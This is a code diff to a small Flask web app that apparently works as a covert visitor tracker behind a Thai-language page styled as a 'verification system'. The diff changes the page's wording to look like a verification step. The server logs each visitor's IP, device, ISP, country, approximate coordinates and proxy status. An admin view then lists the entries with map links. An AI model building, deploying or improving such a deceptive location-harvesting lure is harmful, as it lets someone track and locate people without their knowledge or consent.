@@ -90,7 +90,7 @@ small{color:#aaa}
 <body>
 
 <div class="card">
-    <h2>🔐 รู้สึกท้อหรอ</h2>
+    <h2>🔐 ระบบยืนยัน</h2>
     <p>กดปุ่มเพื่อเริ่มตรวจสอบ</p>
 
     <button onclick="start()">ยืนยัน</button>
@@ -127,7 +127,7 @@ def done():
     return """
 <body style="background:black;color:white;text-align:center;padding:100px">
 <h1>✅ ยืนยันเรียบร้อย</h1>
-<p>หายท้อแล้วนะอยู่กับตัวเอง</p>
+<p>ระบบทำงานเสร็จแล้ว</p>
 </body>
 """
 
@@ -142,15 +142,15 @@ def location():
     ip = request.remote_addr
     ua = request.headers.get("User-Agent", "")
     device = detect_device(ua)
-
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     proxy = False
     isp = "Unknown"
     country = "Unknown"
 
-    lat = "0"
-    lon = "0"
+    # ✅ FIX: no 0,0 anymore
+    lat = None
+    lon = None
     acc = 999
 
     try:
@@ -158,15 +158,15 @@ def location():
         proxy = res.get("proxy", False)
         isp = res.get("isp", "Unknown")
         country = res.get("country", "Unknown")
-        lat = res.get("lat", 0)
-        lon = res.get("lon", 0)
+        lat = res.get("lat")
+        lon = res.get("lon")
     except:
         pass
 
     reliability = calc_reliability(acc, percent, proxy, device)
 
     with open("log.txt","a") as f:
-        f.write(f"{time}|{ip}|{device}|{country}|{isp}|{lat}|{lon}|{acc}|{percent}|{proxy}|{reliability}\n")
+        f.write(f"{time}|{ip}|{device}|{country}|{isp}|{lat or 'Unknown'}|{lon or 'Unknown'}|{acc}|{percent}|{proxy}|{reliability}\n")
 
     return jsonify({"ok":True})
 
@@ -185,7 +185,12 @@ def admin():
             for line in f:
                 t,ip,device,country,isp,lat,lon,acc,percent,proxy,rel = line.strip().split("|")
 
-                link = f"https://www.google.com/maps?q={lat},{lon}"
+                # ✅ FIX MAP LINK
+                if lat == "Unknown" or lon == "Unknown":
+                    link_html = "❌"
+                else:
+                    link = f"https://www.google.com/maps?q={lat},{lon}"
+                    link_html = f'<a href="{link}" target="_blank">📍</a>'
 
                 pr = int(percent)
                 color = "lime" if pr > 80 else "orange" if pr > 50 else "red"
@@ -202,7 +207,7 @@ def admin():
                     <td style='color:{color}'>{percent}%</td>
                     <td>{proxy}</td>
                     <td>{rel}</td>
-                    <td><a href="{link}" target="_blank">📍</a></td>
+                    <td>{link_html}</td>
                 </tr>
                 """
 
@@ -240,7 +245,7 @@ new Chart(ctx, {{
     data: {{
         labels: {list(range(len(accs)))},
         datasets: [
-            {{ label: 'Accuracy (m)', data: {accs} }},
+            {{ label: 'Accuracy', data: {accs} }},
             {{ label: 'Reliability', data: {rels} }}
         ]
     }}
